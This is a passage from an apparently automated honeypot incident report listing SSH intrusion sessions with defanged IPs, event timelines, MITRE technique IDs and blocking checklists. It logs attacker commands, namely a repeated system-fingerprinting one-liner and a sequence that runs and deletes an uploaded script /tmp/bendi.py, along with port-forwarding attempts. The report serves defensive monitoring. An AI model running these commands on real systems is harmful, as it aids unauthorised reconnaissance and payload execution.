- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae25b27441ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:13 |
| **Last Seen** | 2026-07-17 03:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:13:41` | `cowrie.session.connect` |
| `2026-07-17 03:13:42` | `cowrie.client.version` |
| `2026-07-17 03:13:42` | `cowrie.client.kex` |
| `2026-07-17 03:13:43` | `cowrie.login.success` |
| `2026-07-17 03:13:44` | `cowrie.session.params` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.success` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.command.input` |
| `2026-07-17 03:13:44` | `cowrie.log.closed` |
| `2026-07-17 03:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54332aa7b463

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-17 03:14 |
| **Last Seen** | 2026-07-17 03:16 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:14:25` | `cowrie.session.connect` |
| `2026-07-17 03:14:25` | `cowrie.client.version` |
| `2026-07-17 03:14:25` | `cowrie.client.kex` |
| `2026-07-17 03:14:26` | `cowrie.login.success` |
| `2026-07-17 03:14:28` | `cowrie.session.file_upload` |
| `2026-07-17 03:14:29` | `cowrie.session.params` |
| `2026-07-17 03:14:29` | `cowrie.command.input` |
| `2026-07-17 03:14:29` | `cowrie.command.input` |
| `2026-07-17 03:14:29` | `cowrie.command.input` |
| `2026-07-17 03:14:29` | `cowrie.command.failed` |
| `2026-07-17 03:14:29` | `cowrie.log.closed` |
| `2026-07-17 03:14:30` | `cowrie.session.params` |
| `2026-07-17 03:14:30` | `cowrie.command.input` |
| `2026-07-17 03:14:30` | `cowrie.log.closed` |
| `2026-07-17 03:14:31` | `cowrie.session.params` |
| `2026-07-17 03:14:31` | `cowrie.command.input` |
| `2026-07-17 03:14:31` | `cowrie.log.closed` |
| `2026-07-17 03:14:32` | `cowrie.session.params` |
| `2026-07-17 03:14:32` | `cowrie.command.input` |
| `2026-07-17 03:14:32` | `cowrie.command.failed` |
| `2026-07-17 03:14:32` | `cowrie.command.failed` |
| `2026-07-17 03:15:34` | `cowrie.session.params` |
| `2026-07-17 03:15:34` | `cowrie.command.input` |
| `2026-07-17 03:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6dc33d0c8c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:15 |
| **Last Seen** | 2026-07-17 03:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:15:29` | `cowrie.session.connect` |
| `2026-07-17 03:15:29` | `cowrie.client.version` |
| `2026-07-17 03:15:29` | `cowrie.client.kex` |
| `2026-07-17 03:15:31` | `cowrie.login.success` |
| `2026-07-17 03:15:32` | `cowrie.session.params` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.success` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.command.input` |
| `2026-07-17 03:15:32` | `cowrie.log.closed` |
| `2026-07-17 03:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842c04f250a5

| Field | Detail |
|---|---|
| **Source IP** | `110.136.126[.]131` |
| **First Seen** | 2026-07-17 03:17 |
| **Last Seen** | 2026-07-17 03:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:17:20` | `cowrie.session.connect` |
| `2026-07-17 03:17:21` | `cowrie.client.version` |
| `2026-07-17 03:17:21` | `cowrie.client.kex` |
| `2026-07-17 03:17:23` | `cowrie.login.success` |
| `2026-07-17 03:17:24` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.136.126[.]131` to AbuseIPDB if not already reported
- [ ] Block `110.136.126[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201b08f30782

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:17 |
| **Last Seen** | 2026-07-17 03:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:17:25` | `cowrie.session.connect` |
| `2026-07-17 03:17:26` | `cowrie.client.version` |
| `2026-07-17 03:17:26` | `cowrie.client.kex` |
| `2026-07-17 03:17:27` | `cowrie.login.success` |
| `2026-07-17 03:17:28` | `cowrie.session.params` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.success` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:28` | `cowrie.command.input` |
| `2026-07-17 03:17:29` | `cowrie.log.closed` |
| `2026-07-17 03:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e7e6036448

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-07-17 03:17 |
| **Last Seen** | 2026-07-17 03:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:17:29` | `cowrie.session.connect` |
| `2026-07-17 03:17:30` | `cowrie.client.version` |
| `2026-07-17 03:17:30` | `cowrie.client.kex` |
| `2026-07-17 03:17:33` | `cowrie.login.success` |
| `2026-07-17 03:17:33` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96895f8f1530

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:19 |
| **Last Seen** | 2026-07-17 03:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:19:15` | `cowrie.session.connect` |
| `2026-07-17 03:19:15` | `cowrie.client.version` |
| `2026-07-17 03:19:15` | `cowrie.client.kex` |
| `2026-07-17 03:19:16` | `cowrie.login.success` |
| `2026-07-17 03:19:18` | `cowrie.session.params` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.success` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.command.input` |
| `2026-07-17 03:19:18` | `cowrie.log.closed` |
| `2026-07-17 03:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c97621147a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:21 |
| **Last Seen** | 2026-07-17 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:21:09` | `cowrie.session.connect` |
| `2026-07-17 03:21:09` | `cowrie.client.version` |
| `2026-07-17 03:21:09` | `cowrie.client.kex` |
| `2026-07-17 03:21:10` | `cowrie.login.success` |
| `2026-07-17 03:21:12` | `cowrie.session.params` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.success` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.command.input` |
| `2026-07-17 03:21:12` | `cowrie.log.closed` |
| `2026-07-17 03:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e02a1c390db

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:22 |
| **Last Seen** | 2026-07-17 03:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:22:56` | `cowrie.session.connect` |
| `2026-07-17 03:22:56` | `cowrie.client.version` |
| `2026-07-17 03:22:56` | `cowrie.client.kex` |
| `2026-07-17 03:22:58` | `cowrie.login.success` |
| `2026-07-17 03:23:00` | `cowrie.session.params` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.success` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:00` | `cowrie.command.input` |
| `2026-07-17 03:23:01` | `cowrie.log.closed` |
| `2026-07-17 03:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce022d4de28

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 03:22 |
| **Last Seen** | 2026-07-17 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:22:58` | `cowrie.session.connect` |
| `2026-07-17 03:22:58` | `cowrie.client.version` |
| `2026-07-17 03:22:58` | `cowrie.client.kex` |
| `2026-07-17 03:22:58` | `cowrie.login.success` |
| `2026-07-17 03:22:59` | `cowrie.session.params` |
| `2026-07-17 03:22:59` | `cowrie.command.input` |
| `2026-07-17 03:22:59` | `cowrie.log.closed` |
| `2026-07-17 03:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0940944bd3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:24 |
| **Last Seen** | 2026-07-17 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:24:40` | `cowrie.session.connect` |
| `2026-07-17 03:24:40` | `cowrie.client.version` |
| `2026-07-17 03:24:40` | `cowrie.client.kex` |
| `2026-07-17 03:24:42` | `cowrie.login.success` |
| `2026-07-17 03:24:43` | `cowrie.session.params` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.success` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:43` | `cowrie.command.input` |
| `2026-07-17 03:24:44` | `cowrie.log.closed` |
| `2026-07-17 03:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-859e56350414

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-17 03:25 |
| **Last Seen** | 2026-07-17 03:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:25:11` | `cowrie.session.connect` |
| `2026-07-17 03:25:12` | `cowrie.client.version` |
| `2026-07-17 03:25:12` | `cowrie.client.kex` |
| `2026-07-17 03:25:14` | `cowrie.login.success` |
| `2026-07-17 03:25:15` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44147db0dd0

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-17 03:25 |
| **Last Seen** | 2026-07-17 03:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:25:21` | `cowrie.session.connect` |
| `2026-07-17 03:25:22` | `cowrie.client.version` |
| `2026-07-17 03:25:22` | `cowrie.client.kex` |
| `2026-07-17 03:25:24` | `cowrie.login.success` |
| `2026-07-17 03:25:25` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a59b6f584d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:26 |
| **Last Seen** | 2026-07-17 03:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:26:25` | `cowrie.session.connect` |
| `2026-07-17 03:26:25` | `cowrie.client.version` |
| `2026-07-17 03:26:25` | `cowrie.client.kex` |
| `2026-07-17 03:26:26` | `cowrie.login.success` |
| `2026-07-17 03:26:27` | `cowrie.session.params` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.success` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.command.input` |
| `2026-07-17 03:26:27` | `cowrie.log.closed` |
| `2026-07-17 03:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed8ecae76b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:28 |
| **Last Seen** | 2026-07-17 03:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:28:17` | `cowrie.session.connect` |
| `2026-07-17 03:28:17` | `cowrie.client.version` |
| `2026-07-17 03:28:17` | `cowrie.client.kex` |
| `2026-07-17 03:28:18` | `cowrie.login.success` |
| `2026-07-17 03:28:19` | `cowrie.session.params` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
| `2026-07-17 03:28:19` | `cowrie.command.input` |
